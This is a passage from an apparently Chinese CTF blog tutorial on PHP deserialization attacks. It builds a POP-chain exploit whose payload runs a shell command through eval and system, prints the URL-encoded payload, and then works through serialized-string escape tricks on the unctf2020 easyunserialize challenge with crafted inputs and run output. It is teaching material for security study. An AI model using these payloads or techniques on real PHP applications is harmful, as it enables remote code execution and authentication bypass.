</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/15 21:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $v1;</span><br><span class="line">    <span class="keyword">public</span> $v2;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="keyword">$this</span>-&gt;v1(<span class="keyword">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;v1-&gt;world();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $f1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params">$a, $b</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;f1-&gt;get_flag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a-&gt;run();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $m1;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="keyword">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="keyword">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> fin();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1=<span class="keyword">new</span> what();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a=<span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1 =<span class="keyword">new</span> crow();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1-&gt;v1=<span class="keyword">new</span> fin();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1=<span class="keyword">new</span> mix();</span><br><span class="line"></span><br><span class="line">$a-&gt;f1-&gt;a-&gt;m1-&gt;v1-&gt;f1-&gt;m1=<span class="string">&quot;\nsystem(&#x27;find | xargs grep flag&#x27;);&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($a));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A4%3A%22what%22%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3BO%3A4%3A%22crow%22%3A2%3A%7Bs%3A2%3A%22v1%22%3BO%3A3%3A%22fin%22%3A1%3A%7Bs%3A2%3A%22f1%22%3BO%3A3%3A%22mix%22%3A1%3A%7Bs%3A2%3A%22m1%22%3Bs%3A34%3A%22%0Asystem%28%27find+%7C+xargs+grep+flag%27%29%3B%22%3B%7D%7Ds%3A2%3A%22v2%22%3BN%3B%7D%7D%7D%7Dhello114514</span><br></pre></td></tr></table></figure><p>拿到flag</p><p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515233430846.png" alt="image-20220515233430846"></p><h1 id="字符串逃逸"><a href="#字符串逃逸" class="headerlink" title="字符串逃逸"></a>字符串逃逸</h1><ul><li>可以分两种：字符增加和字符减少</li></ul><h3 id="字符增加"><a href="#字符增加" class="headerlink" title="字符增加"></a>字符增加</h3><p>核心即构造闭合。</p><p>直接上例题 unctf2020 easyunserialize：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$uname=$_GET[<span class="number">1</span>];</span><br><span class="line">$password=<span class="number">1</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><blockquote><p>先反序列化：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Created</span> by PhpStorm_培训</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: shmily-ing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Data</span>: 2022/5/8 15:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//    public function __wakeup()</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        if($this-&gt;password===&#x27;easy&#x27;)</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            include(&#x27;flag.php&#x27;);</span></span><br><span class="line"><span class="comment">//            echo $flag;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//        else</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            echo &#x27;wrong password&#x27;;</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;easychallenge&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</span></span><br><span class="line"><span class="comment">//$uname = &#x27;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&#x27;;</span></span><br><span class="line">$uname = <span class="string">&#x27;challenge&#x27;</span>;</span><br><span class="line">$password = <span class="number">1</span>;</span><br><span class="line">$s = <span class="keyword">new</span> a($uname,$password);</span><br><span class="line">var_dump($s);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($s)));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(filter(serialize($s))));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>$uname = &#39;challenge&#39;;</code>结果为:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">D:\phpstudy_pro\Extensions\php\php7<span class="number">.1</span><span class="number">.9</span>nts\php.exe C:\Users\<span class="number">25390</span>\PhpstormProjects\培训\exp4.php</span><br><span class="line"><span class="keyword">object</span>(a)<span class="comment">#1 (2) &#123;</span></span><br><span class="line">  [<span class="string">&quot;uname&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;challenge&quot;</span></span><br><span class="line">  [<span class="string">&quot;password&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">string</span>(<span class="number">59</span>) <span class="string">&quot;O:1:&quot;</span>a<span class="string">&quot;:2:&#123;s:5:&quot;</span>uname<span class="string">&quot;;s:9:&quot;</span>challenge<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;i:1;&#125;&quot;</span> </span><br><span class="line"><span class="keyword">string</span>(<span class="number">63</span>) <span class="string">&quot;O:1:&quot;</span>a<span class="string">&quot;:2:&#123;s:5:&quot;</span>uname<span class="string">&quot;;s:9:&quot;</span>easychallenge<span class="string">&quot;;s:8:&quot;</span>password<span class="string">&quot;;i:1;&#125;&quot;</span></span><br><span class="line"><span class="keyword">bool</span>(<span class="literal">false</span>)</span><br><span class="line"></span><br><span class="line">Process finished with <span class="keyword">exit</span> code <span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>bool(false)说明序列化字符串有问题，不能被反序列化</p><p>var_dump(filter(serialize($s)));  ——》O:1:”a”:2:{s:5:”uname”;s:9:”easychallenge”;s:8:”password”;i:1;} </p><p>问题就在 challenge -&gt; easychallenge 字符增加4，但uname的长度仍为9个字符，</p><p>所以需要为了保证经过filter()函数处理后的序列化内容能够合规，每传入一个challenge，我们就需要在challenge后面加4个字符。</p><p>我们目的需要让password的值为easy，题目中给的为固定值，我们只有构造闭合<code>password=&quot;easy&quot;,&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>共有29个字符</p><p>逃逸构造:</p><p>8个challenge，构造32个字符， 29+3即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$uname = <span class="string">&#x27;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&#x27;</span>;</span><br></pre></td></tr></table></figure><p>运行结果</p><p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515144058398.png" alt="image-20220515144058398"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">object(a)#1 (2) &#123;</span><br><span class="line">  [&quot;uname&quot;]&#x3D;&gt;</span><br><span class="line">  string(104) &quot;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  int(1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">string(156) &quot;O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:104:&quot;challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&quot;;s:8:&quot;password&quot;;i:1;&#125;&quot;</span><br><span class="line"></span><br><span class="line">string(188) &quot;O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:104:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa&quot;;s:8:&quot;password&quot;;i:1;&#125;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">object(a)#2 (2) &#123;</span><br><span class="line">  [&quot;uname&quot;]&#x3D;&gt;</span><br><span class="line">  string(104) &quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;</span><br><span class="line">  [&quot;password&quot;]&#x3D;&gt;</span><br><span class="line">  string(4) &quot;easy&quot;            #可以看到password的值已经传入成功</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>O:1:&quot;a&quot;:2:&#123;s:5:&quot;uname&quot;;s:104:&quot;easychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallengeeasychallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>aaa”;s:8:”password”;i:1;}``</p><p>由于只有两个对象，并且闭合成功，灰色部分就不能执行被丢弃了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?1&#x3D;</span><br><span class="line">challengechallengechallengechallengechallengechallengechallengechallenge&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;aaa</span><br></pre></td></tr></table></figure><p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515133610433.png" alt="image-20220515133610433"></p><h3 id="字符减少"><a href="#字符减少" class="headerlink" title="字符减少"></a>字符减少</h3><p>对上题的简单修改</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $u;</span><br><span class="line">    <span class="keyword">public</span> $uname;</span><br><span class="line">    <span class="keyword">public</span> $password;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$u,$uname,$password</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;u = $u;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;uname=$uname;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password=$password;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;password===<span class="string">&#x27;easy&#x27;</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> $flag;    </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;wrong password&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> str_replace(<span class="string">&#x27;challenge&#x27;</span>,<span class="string">&#x27;&#x27;</span>,$string);</span><br><span class="line">&#125;</span><br><span class="line">$u=$_GET[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line">$uname=$_GET[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">$password=<span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">$ser=filter(serialize(<span class="keyword">new</span> a($u,$uname,$password)));</span><br><span class="line">$test=unserialize($ser);</span><br><span class="line">var_dump($test);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>目的还是password===easy</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">&#x2F;**</span><br><span class="line"> * @Created by PhpStorm_培训</span><br><span class="line"> * @Author: shmily-ing</span><br><span class="line"> * @Data: 2022&#x2F;5&#x2F;8 15:51</span><br><span class="line"> *&#x2F;</span><br><span class="line">class a</span><br><span class="line">&#123;</span><br><span class="line">    public $u;</span><br><span class="line">    public $uname;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($u,$uname,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;u &#x3D; $u;</span><br><span class="line">        $this-&gt;uname&#x3D;$uname;</span><br><span class="line">        $this-&gt;password&#x3D;$password;</span><br><span class="line">    &#125;</span><br><span class="line">&#x2F;&#x2F;    public function __wakeup()</span><br><span class="line">&#x2F;&#x2F;    &#123;</span><br><span class="line">&#x2F;&#x2F;        if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;easy&#39;)</span><br><span class="line">&#x2F;&#x2F;        &#123;</span><br><span class="line">&#x2F;&#x2F;            include(&#39;flag.php&#39;);</span><br><span class="line">&#x2F;&#x2F;            echo $flag;</span><br><span class="line">&#x2F;&#x2F;        &#125;</span><br><span class="line">&#x2F;&#x2F;        else</span><br><span class="line">&#x2F;&#x2F;        &#123;</span><br><span class="line">&#x2F;&#x2F;            echo &#39;wrong password&#39;;</span><br><span class="line">&#x2F;&#x2F;        &#125;</span><br><span class="line">&#x2F;&#x2F;    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;challenge&#39;,&#39;&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$u&#x3D;&#39;xxxxx&#39;;</span><br><span class="line">$uname &#x3D; &#39;xxxxx&#39;;</span><br><span class="line">$password &#x3D; &#39;1&#39;;</span><br><span class="line">$s &#x3D; new a($u,$uname,$password);</span><br><span class="line">var_dump($s);</span><br><span class="line"></span><br><span class="line">var_dump(serialize($s));</span><br><span class="line"></span><br><span class="line">var_dump(filter(serialize($s)));</span><br><span class="line"></span><br><span class="line">var_dump(unserialize(filter(serialize($s))))</span><br></pre></td></tr></table></figure><ol><li>我们要构造<code>&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>才能达到目的</li><li>challenge会被置空，会导致<code>&quot;;s:5:&quot;uname&quot;;s:59:&quot;aaaaaaa</code>成为自己的值，所以还需要构造<code>;s:5:&quot;uname&quot;;s:4:&quot;test&quot;</code>  uname的值是能够真正传进去的值</li></ol><p><img src="/2022/04/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20220515162549559.png" alt="image-20220515162549559"></p><p>所以$uname 需要构造成<code>&quot;;s:5:&quot;uname&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;easy&quot;;&#125;</code>一共52个字符</p><p>但是这样肯定是不行,结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 